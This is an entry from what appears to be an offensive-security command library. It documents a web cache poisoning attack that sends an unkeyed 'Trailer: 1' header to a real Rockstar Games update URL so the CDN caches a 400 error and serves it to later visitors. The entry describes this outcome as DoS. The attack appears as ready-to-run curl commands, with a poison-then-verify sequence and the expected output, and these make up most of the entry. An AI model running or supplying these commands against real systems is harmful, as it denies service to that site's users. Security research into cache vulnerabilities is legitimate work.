---
id: cmd-001
data: >-
  curl -X GET
  "https://updates.rockstargames.com/patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1"
  -H "Host: updates.rockstargames.com" -H "Trailer: 1" -v
tags:
  - http
  - cache-poisoning
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:55.939Z'
verified: false
validated: true
submitted: true
---
# HTTP GET with Trailer Header for Cache Poisoning

## Command

```bash
curl -X GET "https://updates.rockstargames.com/patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1" -H "Host: updates.rockstargames.com" -H "Trailer: 1" -v
```

## Description

This command uses curl to send an HTTP GET request with a malicious 'Trailer: 1' header to poison a CDN cache. It targets a specific endpoint on updates.rockstargames.com, causing the server to return a 400 Bad Request, which gets cached and served to future requests, enabling DoS. Use this in testing web cache vulnerabilities where headers are unkeyed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL path | Target endpoint URL with query params (e.g., ?donotpoisoneveryone=1) | Yes |
| `-H "Host: ..."` | Sets the Host header to the target domain | Yes |
| `-H "Trailer: 1"` | Injects the unkeyed trailer header to trigger 400 | Yes |
| `-v` | Verbose mode to show headers and status | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://updates.rockstargames.com/patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1" -H "Host: updates.rockstargames.com" -H "Trailer: 1"
```

### Advanced Usage (with verification)

First poison, then verify:

```bash
# Poison
curl -X GET "https://updates.rockstargames.com/patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1" -H "Host: updates.rockstargames.com" -H "Trailer: 1" -v

# Verify (should return 400)
curl -X GET "https://updates.rockstargames.com/patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1" -v
```

## Expected Output

Successful execution shows HTTP/1.1 400 Bad Request in verbose mode, with response headers indicating caching. For verification, the clean request outputs the same 400 status and a minimal error body, confirming cache poisoning.

## Related

- [[Related Procedure|procedures/Exploit-Cache-Poisoning-with-Trailer-Header]]
